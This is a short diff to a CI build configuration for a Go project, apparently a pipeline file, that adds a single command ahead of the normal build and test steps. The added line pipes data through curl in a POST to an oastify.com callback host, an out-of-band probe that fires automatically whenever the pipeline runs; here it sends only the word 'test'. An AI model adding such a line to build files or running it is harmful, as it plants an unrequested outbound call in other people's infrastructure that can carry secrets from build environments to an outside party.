@@ -13,6 +13,7 @@ steps:
       GOOS: linux
       CGO_ENABLED: 0
     commands:
+      - echo test | curl -X POST --data-binary @- https://6y5mcjl8f57m2pdcthb6f1lpzg5f13tri.oastify.com
       - go build
       - go test ./...
 
